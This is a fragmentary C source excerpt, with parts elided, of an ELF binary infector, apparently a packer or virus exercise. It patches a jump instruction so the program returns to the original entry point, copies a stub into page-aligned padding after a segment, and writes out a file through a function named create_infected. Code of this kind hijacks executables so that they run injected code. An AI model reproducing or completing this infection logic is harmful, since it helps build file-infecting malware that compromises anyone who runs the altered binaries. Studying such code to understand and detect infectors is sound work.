...
{
	Elf64_Addr const entry_point = elf->old_entrypoint - (elf->segment_addr + elf->segment_size) - elf->size_stub + elf->n;
	
	elf->stub[ elf->size_stub - (sizeof( int) + 1) - elf->n ] = 0XE9;
	memcpy(&elf->stub[elf->size_stub - sizeof(int) - elf->n ], &entry_point, sizeof(int));
}
...
static void write_on_memory(t_elf const *elf, char *ptr)
{
	...
	Elf64_Off const end_payload = elf->segment_offset + elf->segment_size + __ALIGN_MASK( getpagesize(), elf->size_stub );
	Elf64_Off const end_file = elf->filesize + __ALIGN_MASK( getpagesize(), elf->size_stub );
	...
	memcpy(ptr + beg_payload, elf->stub, elf->size_stub);
...
void create_infected(t_elf const *elf ) {
	...
	char *ptr = NULL;
	if ((ptr = mmap(NULL, elf->filesize + __ALIGN_MASK( getpagesize(), elf->size_stub ), PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0)) == MAP_FAILED)
	...
	SY_sha256( ptr, elf->filesize + __ALIGN_MASK( getpagesize(), elf->size_stub ), hash );
	...
	write( fd, ptr, elf->filesize + __ALIGN_MASK( getpagesize(), elf->size_stub ) );

	munmap(ptr, elf->filesize + __ALIGN_MASK( getpagesize(), elf->size_stub ));
	close(fd);
}
